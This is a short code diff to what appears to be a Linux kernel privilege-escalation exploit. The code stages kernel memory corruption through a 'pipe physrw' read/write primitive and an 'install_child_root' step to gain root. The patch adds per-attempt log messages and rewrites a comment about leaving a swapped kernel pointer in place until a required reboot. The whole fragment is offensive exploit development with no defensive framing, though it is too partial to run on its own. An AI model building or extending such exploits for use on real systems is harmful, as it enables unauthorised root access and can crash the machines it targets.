@@ -1488,10 +1488,14 @@ int try_cfi_stage(void) {
     if (attempt != 0) {
       reset_pipe_attempt();
     }
+    pr_info("pipe physrw attempt=%d/%d\n", attempt + 1,
+            PIPE_MAX_ATTEMPTS);
     if (install_child_root(fd)) {
       installed = 1;
       break;
     }
+    pr_warning("pipe physrw attempt=%d/%d failed\n", attempt + 1,
+               PIPE_MAX_ATTEMPTS);
     if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
         physrw_read64_ok && physrw_write64_ok) {
       break;
@@ -1556,8 +1560,8 @@ fail:
     } else {
       /* HARDENED_USERCOPY rejects configfs writes into kernel .data and
        * panic_on_oops makes that fatal. Until pipe physrw exists, leave the
-       * swapped global pointer in place and rely on the mandatory reboot
-       * after a failed run instead of attempting an unsafe restoration. */
+       * swapped global pointer in place. The caller keeps the backing page
+       * alive until the required reboot. */
       cfi_restore_ret = -1;
     }
     uint64_t null_owner_fail = 0;
